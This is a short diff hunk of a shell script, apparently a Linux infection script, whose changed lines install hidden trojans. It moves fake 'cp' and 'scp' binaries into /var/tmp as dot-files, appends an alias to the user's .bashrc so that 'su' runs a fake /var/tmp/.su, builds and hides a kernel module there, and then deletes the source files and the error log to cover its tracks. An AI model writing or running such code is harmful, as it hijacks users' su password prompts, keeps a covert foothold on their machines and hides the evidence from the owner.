@@ -14,10 +14,10 @@ mv .fake_cp /var/tmp/.fake_cp 2> errlog
 mv .fake_scp /var/tmp/.fake_scp 2> errlog
 cp /home/$USER/.bashrc /var/tmp/.originrc 2> errlog
 echo "alias su=/var/tmp/.su">>/home/$USER/.bashrc
-source /home/$USER/.bashrc 2> errlog
+source ~/.bashrc 2> errlog
 make all 2> errlog 1> errlog
 cp hello.ko /var/tmp/.hello.ko 2> errlog
-rm fake_su.c fake_cp.cpp fake_scp.cpp Makefile .infect.sh recover.sh 2> errlog
-rm hello.c hello.ko hello.mod.o hello.o 2> errlog
+rm fake_su.cpp fake_cp.cpp fake_scp.cpp Makefile .infect.sh recover.sh 2> errlog
+rm hello.c hello.ko hello.mod.o hello.o hello.mod.c Module.symvers modules.order 2> errlog
 rm errlog
 stty echo
